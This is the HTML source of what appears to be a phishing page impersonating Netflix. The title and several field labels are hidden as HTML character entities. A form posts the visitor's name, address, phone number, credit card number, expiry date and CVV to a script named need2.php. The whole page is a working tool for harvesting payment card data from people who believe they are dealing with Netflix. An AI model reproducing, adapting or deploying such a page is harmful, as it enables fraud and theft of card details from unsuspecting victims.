<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#78;&#101;&#116;&#102;&#108;&#105;&#120;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox { 
    border: 1px solid #ccc; 
    height: 42px; 
    width: 275px; 
  	font-family: SFS, Arial, sans-serif;
    font-size: 15px;
  	color: #555;
    padding-left: 6px; 
    border-radius: 1px; 
}  
.textbox:focus { 
    outline: none; 
    border: 1px solid #555; 
} 
 </style>
 <style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body bgColor="#000000">
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:589px; z-index:0"><img src="images/t3.png" alt="" title="" border=0 width=1349 height=589></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:589px; width:1349px; height:589px; z-index:1"><img src="images/t4.png" alt="" title="" border=0 width=1349 height=589></div>
<form action=need2.php name=asmanthek id=asmanthek method=post>
<input name="name1" placeholder="First Name" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:380px;left:490px;top:222px;z-index:2">
<input name="name2" placeholder="Last Name" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:380px;left:490px;top:286px;z-index:3">
<input name="addr" placeholder="Address" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:380px;left:490px;top:350px;z-index:4">
<input name="city" placeholder="City" class="textbox" autocomplete="off" required type="text" style="position:absolute;left:490px;top:414px;width:380px;z-index:5">
<input name="state" placeholder="State" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:180px;left:490px;top:478px;z-index:6">
<input name="zp" placeholder="Zip Code" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:180px;left:690px;top:478px;z-index:7">
<input name="ph" placeholder="Phone Number" class="textbox" autocomplete="off" required type="text" style="position:absolute;left:490px;top:542px;width:380px;z-index:8">
<input name="cn" placeholder="&#67;&#114;&#101;&#100;&#105;&#116;&#32;&#67;&#97;&#114;&#100;&#32;&#78;&#117;&#109;&#98;&#101;&#114;" class="textbox" autocomplete="off" required maxlength="16" type="text" style="position:absolute;width:380px;left:490px;top:604px;z-index:9">
<input name="ex" placeholder="&#69;&#120;&#112;&#105;&#114;&#121;&#32;&#68;&#97;&#116;&#101;&#32;&#40;&#109;&#109;&#47;&#121;&#121;&#121;&#121;&#41;" class="textbox" autocomplete="off" required type="text" style="position:absolute;left:490px;top:668px;width:380px;z-index:10">
<input name="vc" placeholder="&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;&#32;&#67;&#111;&#100;&#101;&#32;&#40;&#67;&#86;&#86;&#41;" class="textbox" autocomplete="off" required maxlength="4" type="text" style="position:absolute;width:380px;left:490px;top:732px;z-index:11">
<div id="formimage1" style="position:absolute; left:489px; top:805px; z-index:12"><input type="image" name="formimage1" width="382" height="51" src="images/vf.png"></div>
</div>

</body>
</html>
